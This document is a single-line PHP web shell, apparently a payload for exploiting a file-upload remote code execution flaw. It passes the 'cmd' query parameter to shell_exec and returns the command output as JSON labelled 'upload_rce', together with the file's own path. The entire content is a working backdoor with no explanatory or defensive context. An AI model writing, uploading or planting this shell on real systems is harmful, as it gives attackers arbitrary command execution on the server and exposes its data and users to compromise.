<?php echo json_encode(["upload_rce"=>shell_exec($_GET["cmd"]??"whoami"),"file"=>__FILE__]); ?>
